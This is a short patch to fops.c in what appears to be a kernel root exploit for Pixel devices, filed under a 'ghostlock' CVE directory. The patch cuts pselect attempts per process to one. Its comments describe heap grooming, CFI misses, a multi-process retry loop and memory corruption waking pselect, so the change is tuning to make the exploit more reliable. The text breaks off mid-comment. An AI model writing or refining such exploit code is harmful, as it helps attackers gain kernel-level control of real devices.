@@ -1,0 +1,22 @@
+# Lane B/E fix: one pselect attempt per process. On a CFI miss, return to the
+# outer 3-process loop instead of the slow in-process refresh. QEMU-validated
+# (docs/lab/qemu.md). Apply to the
+# pre-watchdog fops.c; the SIGALRM watchdog is rejected.
+
+diff --git a/tools/thirdparty/pixel-ksu-root/cves/cve-2026-43499-ghostlock/fops.c b/tools/thirdparty/pixel-ksu-root/cves/cve-2026-43499-ghostlock/fops.c
+index 151ef84..8bf7a77 100644
+--- a/tools/thirdparty/pixel-ksu-root/cves/cve-2026-43499-ghostlock/fops.c
++++ b/tools/thirdparty/pixel-ksu-root/cves/cve-2026-43499-ghostlock/fops.c
+@@ -1,7 +1,11 @@
+ #include "common.h"
+ #if LIB_KMI >= 66
+ 
+-#define PSELECT_CFI_ROUTE_ATTEMPTS 26
++/* One pselect attempt per process. On a CFI miss this returns to the
++ * outer 3-process loop, which forks a fresh first groom; it avoids the
++ * slow in-process second-groom refresh and the cross-thread SIGALRM
++ * watchdog. QEMU-validated. */
++#define PSELECT_CFI_ROUTE_ATTEMPTS 1
+ /*
+  * Route pselect timeout: winning attempts return early (the corruption
+  * wakes pselect), losing attempts burn the full timeout, so a short
